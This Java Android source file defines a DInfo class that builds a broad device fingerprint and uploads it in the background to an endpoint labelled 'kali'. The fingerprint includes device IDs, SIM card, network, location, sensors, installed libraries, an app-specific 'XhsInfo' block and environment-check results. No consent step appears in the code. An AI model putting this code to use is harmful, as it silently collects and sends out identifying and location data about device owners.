package com.android.device;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Build;

import com.android.assemble.CollectDeviceInfo;
import com.android.device.comm.Location;
import com.android.device.comm.Net;
import com.android.device.comm.SimCard;
import com.android.device.env.Checker;
import com.android.device.ext.XhsInfo;
import com.android.device.hardware.Battery;
import com.android.device.hardware.Hardware;
import com.android.device.hardware.Sensor;
import com.android.device.hardware.USB;
import com.android.device.ids.IDs;
import com.android.device.software.Input;
import com.android.device.software.Library;
import com.android.device.software.Media;
import com.android.device.software.Screen;
import com.android.device.software.Storage;
import com.android.utils.Http;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DInfo {

    public static void uploadDeviceInfo(Context context) {
        AsyncTask.THREAD_POOL_EXECUTOR.execute(new Runnable() {
            @Override
            public void run() {
                String name = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.getDefault()).format(new Date(System.currentTimeMillis()));
                Http.uploadData("kali", Build.MODEL + "_" + Build.VERSION.SDK_INT + "_DInfo_" + name, getDInfo(context), null);
            }
        });
    }


    private static String getDInfo(Context context) {
        try {
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("ids", IDs.getIDsInfo(context));
            jsonObject.put("build", com.android.device.software.Build.getBuildInfo());
            jsonObject.put("input", Input.getInputInfo(context));
            jsonObject.put("library", Library.getLibraryInfo());
            jsonObject.put("media", Media.getMediaInfo());
            jsonObject.put("screen", Screen.getScreenInfo(context));
            jsonObject.put("storage", Storage.getStorageInfo());
            jsonObject.put("ids", IDs.getIDsInfo(context));
            jsonObject.put("usb", USB.getUsbInfo());
            jsonObject.put("sensor", Sensor.getSensorInfo());
            jsonObject.put("hardware", Hardware.getHardwareInfo(context));
            jsonObject.put("batteryInfo", Battery.getBatteryInfo());
            jsonObject.put("simInfo", SimCard.getSimCardInfo());
            jsonObject.put("net", Net.getNetInfo(context));
            jsonObject.put("location", Location.getLocation());
            jsonObject.put("xhs", XhsInfo.getXInfo(context));
            jsonObject.put("checker", Checker.getEnvCheckerInfo());
            return jsonObject.toString();//镜像 账号 ip 后台
        } catch (Exception e) {
            e.printStackTrace();
        }

        return "";
    }
}
